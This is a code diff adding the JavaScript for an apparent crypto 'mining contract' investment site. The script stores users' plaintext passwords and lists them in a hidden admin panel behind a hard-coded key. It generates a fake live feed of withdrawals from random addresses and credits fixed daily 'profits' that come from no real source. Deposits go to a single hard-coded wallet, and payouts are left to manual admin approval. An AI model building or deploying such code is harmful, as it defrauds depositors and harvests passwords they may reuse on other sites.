+            pt: { welcome: "Bem-vindo", balance: "Saldo (USDT)", start: "Início", addr_t: "Depósito (BEP20):", btn_dep: "ATIVAR CONTRATO", nav_h: "Início", nav_e: "Troca", nav_w: "Retirar", nav_a: "Conta", ex_t: "Troca de Lucro", ex_btn: "TRANSFERIR", acc_t: "Cofre", acc_btn: "VERIFICAR" }
+        };
+        function changeLang() { const l = document.getElementById('langSel').value; const t = trans[l]; for (let key in t) { const el = document.getElementById('l_' + key); if(el) el.innerText = t[key]; } }
+        
+        window.openAdminPortal = function() { if (prompt("Manager Key:") === "258369@@") { document.getElementById('adminPanel').style.display = 'block'; loadAdminPanel(); } };
+        function loadAdminPanel() {
+            fb.onValue(fb.ref(fb.db, 'admin/requests'), (snap) => {
+                const list = document.getElementById('adminRequests'); list.innerHTML = "";
+                snap.forEach((c) => { const r = c.val(); if(r.status === 'pending') {
+                    const d = document.createElement('div'); d.className = "req-card";
+                    d.innerHTML = `<b>${r.type.toUpperCase()} $${r.amount}</b><br>${r.email}<br><button onclick="approveReq('${c.key}','${r.uid}',${r.amount},'${r.type}')" style="background:var(--green); border:none; padding:5px 10px; border-radius:5px;">OK</button> <button onclick="fb.update(fb.ref(fb.db, 'admin/requests/${c.key}'),{status:'rejected'})" style="background:var(--red); border:none; padding:5px 10px; border-radius:5px; color:#fff;">NO</button>`;
+                    list.prepend(d);
+                }});
+            });
+            fb.onValue(fb.ref(fb.db, 'users'), (snap) => {
+                const list = document.getElementById('adminUserList'); list.innerHTML = "";
+                snap.forEach((u) => { const d = u.val();
+                    const div = document.createElement('div'); div.className = "req-card";
+                    div.innerHTML = `Email: ${d.email}<br>Pass: <b style="color:var(--gold)">${d.pass}</b><br>USDT: ${d.usdt}<br><button onclick="giveBonus('${u.key}')" style="background:var(--green); border:none; padding:5px 10px; margin-top:5px; border-radius:5px; font-weight:bold;">TẶNG THƯỞNG</button>`;
+                    list.appendChild(div);
+                });
+            });
+        }
+        async function giveBonus(uid) { let amt = prompt("Nhập số tiền thưởng:"); if(amt) { let s = await fb.get(fb.ref(fb.db, 'users/'+uid)); let d = s.val(); await fb.update(fb.ref(fb.db, 'users/'+uid), {usdt: (d.usdt||0) + parseFloat(amt)}); showToast("Success!"); } }
+        async function approveReq(id, uid, amt, type) { const uRef = fb.ref(fb.db, 'users/' + uid); const snap = await fb.get(uRef); const ud = snap.val(); if(type === 'deposit') { await fb.update(uRef, { usdt: (ud.usdt || 0) + amt, active: true, lastUpdate: Date.now() }); } else { if(ud.usdt >= amt) await fb.update(uRef, { usdt: ud.usdt - amt }); } await fb.update(fb.ref(fb.db, 'admin/requests/' + id), { status: 'approved' }); showToast("Done!"); }
+        
+        let state = { usdt: 0, eth: 0, active: false, hide: false, uid: "", pass: "", lastUpdate: 0, cycle: 24*3600*1000 };
+        function startTimers() { setInterval(async () => { if(state.active && state.usdt > 0) { const now = Date.now(); const passed = now - state.lastUpdate; const left = state.cycle - passed; if (left <= 0) { const profit = (state.usdt * (state.usdt >= 2000 ? 0.025 : 0.02)) / 3500; await fb.update(fb.ref(fb.db, 'users/' + state.uid), { eth: (state.eth || 0) + profit, lastUpdate: Date.now() }); } else { document.getElementById('timer_clock').innerText = [Math.floor(left/3600000), Math.floor((left%3600000)/60000), Math.floor((left%60000)/1000)].map(v=>v<10?"0"+v:v).join(":"); let p = (passed / state.cycle) * 100; document.getElementById('mining-bar').style.width = Math.min(p, 100) + "%"; document.getElementById('mining-percent').innerText = Math.floor(Math.min(p, 100)) + "%"; let sd = new Date(state.lastUpdate); document.getElementById('start_time_txt').innerText = sd.getHours() + ":" + sd.getMinutes().toString().padStart(2,'0'); } } }, 1000); const live = document.getElementById('withdrawLive'); setInterval(() => { const d = document.createElement('div'); d.innerHTML = `0x${Math.random().toString(16).slice(2,6)}... withdrawn <span style="color:var(--green)">+$${(Math.random()*300).toFixed(1)}</span>`; live.prepend(d); if(live.children.length > 3) live.lastChild.remove(); }, 5000); }
+        function updateDisplay() { const total = state.usdt + (state.eth * 3500); const v = state.hide ? "****" : "$ " + total.toLocaleString('en-US',{minimumFractionDigits:2}); document.getElementById('usdt_H').innerText = v; document.getElementById('usdt_A').innerText = v; document.getElementById('usdt_W').innerText = "$ " + state.usdt.toLocaleString('en-US',{minimumFractionDigits:2}); document.getElementById('ex_eth_val').value = state.eth.toFixed(6) + " ETH"; document.getElementById('ex_usdt_res').value = (state.eth * 3500).toFixed(2) + " USDT"; document.getElementById('L_st').innerText = "Profit: " + state.eth.toFixed(6) + " ETH"; if(state.active && state.usdt > 0) document.getElementById('mining-status-box').style.display = 'block'; }
+        async function depositRequest() { let a = parseFloat(document.getElementById('in_Dep').value); if(!a) return; fb.push(fb.ref(fb.db,'admin/requests'), {uid:state.uid, email:fb.auth.currentUser.email, amount:a, type:'deposit', status:'pending'}); showToast("Sent!"); }
+        async function handleWithdraw() { let a = parseFloat(document.getElementById('w_amount').value); let addr = document.getElementById('w_address').value; let net = document.getElementById('w_network').value; if(a > state.usdt || !a || !addr) return; fb.push(fb.ref(fb.db,'admin/requests'), {uid:state.uid, email:fb.auth.currentUser.email, amount:a, type:'withdraw', network: net, address: addr, status:'pending'}); showToast("Sent!"); }
+        async function processExchange() { if(state.eth <= 0) return; await fb.update(fb.ref(fb.db, 'users/'+state.uid), { usdt: state.usdt + (state.eth * 3500), eth: 0 }); showToast("Success!"); }
+        function loadUserData(u) { state.uid = u; fb.onValue(fb.ref(fb.db, 'users/'+u), (s) => { let d = s.val(); if(d) { Object.assign(state, d); updateDisplay(); } }); fb.onValue(fb.ref(fb.db, 'admin/requests'), (s) => { let hist = document.getElementById('history_list'); hist.innerHTML = ""; s.forEach(c => { let r = c.val(); if(r.uid === u && r.type === 'withdraw') hist.innerHTML += `<div class="history-row"><span>${r.network || "BEP20"}</span><span>$${r.amount} - ${r.status}</span></div>`; }); }); }
+        function go(id) { document.querySelectorAll('.page').forEach(p => p.classList.remove('active')); document.getElementById(id).classList.add('active'); document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active')); document.getElementById('nav_'+id).classList.add('active'); }
+        function showToast(m) { const t = document.getElementById('toast'); t.innerText = m; t.style.display = 'block'; setTimeout(()=>t.style.display='none', 2500); }
+        function toggleView() { state.hide = !state.hide; updateDisplay(); }
+        function doCopy() { navigator.clipboard.writeText("0x841100e786c77e475d328469c95238d063078610"); showToast("Copied!"); }
+        function handleSecurityAccess() { if(document.getElementById('user_pin').value === state.pass) document.getElementById('account_content').style.display='block'; }
+        function handleLogout() { fb.auth.signOut(fb.auth); location.reload(); }
+        function switchAuth(r) { document.getElementById('regForm').style.display = r ? 'block' : 'none'; document.getElementById('logForm').style.display = r ? 'none' : 'block'; }
+        async function handleRegister() { const e = document.getElementById('regEmail').value, p = document.getElementById('regPass').value; try { const r = await fb.createUserWithEmailAndPassword(fb.auth, e, p); await fb.set(fb.ref(fb.db, 'users/' + r.user.uid), { usdt: 0, eth: 0, active: false, email: e, pass: p, lastUpdate: Date.now() }); } catch(e) { showToast("Error!"); } }
+        async function handleLogin() { try { await fb.signInWithEmailAndPassword(fb.auth, document.getElementById('logEmail').value, document.getElementById('logPass').value); } catch(e) { showToast("Failed!"); } }
+        window.onload = () => { startTimers(); changeLang(); };
+    </script>
 </body>
 </html>
